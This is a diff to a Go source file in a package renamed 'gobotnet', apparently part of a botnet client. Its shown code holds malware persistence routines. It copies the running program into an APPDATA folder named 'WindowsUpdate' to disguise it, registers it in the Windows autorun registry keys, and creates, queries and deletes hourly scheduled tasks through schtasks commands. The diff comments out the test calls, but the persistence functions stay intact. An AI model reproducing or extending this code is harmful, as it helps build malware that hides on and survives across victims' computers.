@@ -1,20 +1,12 @@
-package prgReg
+package gobotnet
 
 import (
 	"errors"
 	"fmt"
+	"github.com/satori/go.uuid"
+	"golang.org/x/sys/windows/registry"
 	"io"
 	"os"
-	//"os/exec"
-	//"log"
-	//"time"
-	//"syscall"
-	//"unsafe"
-	//"encoding/binary"
-	//"unicode/utf16"
-	//"unicode/utf8"
-	"gobotnet/command"
-	"golang.org/x/sys/windows/registry"
 )
 
 var (
@@ -22,19 +14,21 @@ var (
 	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
 	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
 	sourceExecFilePath string = os.Args[0]
+	uid                uuid.UUID
 )
 
 func RegTest() {
-	var err error
+	fmt.Println("RegTest")
+	// var err error
 
-	err = os.MkdirAll(copyProgramDir, 0777)
-	fmt.Println(err)
+	// err = os.MkdirAll(copyProgramDir, 0777)
+	// fmt.Println(err)
 
-	err = RegisterAutoRun()
-	fmt.Println(err)
+	// err = RegisterAutoRun()
+	// fmt.Println(err)
 
-	err = CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
-	fmt.Println(err)
+	// err = CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
+	// fmt.Println(err)
 }
 
 func GetRegistryKey(typeReg registry.Key, regPath string) (key registry.Key, err error) {
@@ -86,15 +80,15 @@ func UnRegisterAutoRun() {
 }
 
 func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
-	return prgCmd.CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
+	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
 }
 
 func IsRegisterSchedule(nameTask string) ([]byte, error) {
-	return prgCmd.CmdExec("schtasks /query /tn " + nameTask + "\"")
+	return CmdExec("schtasks /query /tn " + nameTask + "\"")
 }
 
 func UnRegisterSchedule(nameTask string) ([]byte, error) {
-	return prgCmd.CmdExec("schtasks /delete /f /tn " + nameTask)
+	return CmdExec("schtasks /delete /f /tn " + nameTask)
 }
 
 func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
